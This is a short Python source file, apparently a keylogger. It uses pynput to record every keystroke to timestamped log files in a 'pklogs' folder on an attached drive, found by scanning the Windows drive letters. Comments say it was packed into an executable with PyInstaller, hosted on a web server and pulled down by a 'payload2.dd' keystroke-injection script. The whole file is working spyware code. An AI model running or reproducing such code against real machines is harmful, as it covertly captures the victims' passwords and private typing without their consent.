from pynput.keyboard import Listener
import logging
import win32api
import os

# This script was bundled into a .exe using PyInstaller
# The executable was stored in a webserver and retrived by the payload2.dd script

log_dir = ""

drives = win32api.GetLogicalDriveStrings()
print(drives)
drives = drives.split('\000')[:-1]
for drive in drives:
    currpath = os.path.join(drive,'pklogs')
    if (os.path.isdir(currpath)):
        log_dir = currpath
        break
print(log_dir)

def fileindexed(name, extension):
    counter = 0
    print(os.path.join(log_dir, name + str(counter) + extension))
    while True:
        filepath = os.path.join(log_dir, name + str(counter) + extension)
        if (os.path.isfile(filepath)):
            counter += 1
        else:
            break
    return os.path.join(log_dir, name + str(counter) + extension)

filepath = fileindexed("key_log", ".txt")
print(filepath)
logging.basicConfig(filename=(filepath), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    # FOR TESTING
    # if key == Key.esc:
    #     return False

with Listener(on_press=on_press) as listener:
    listener.join()
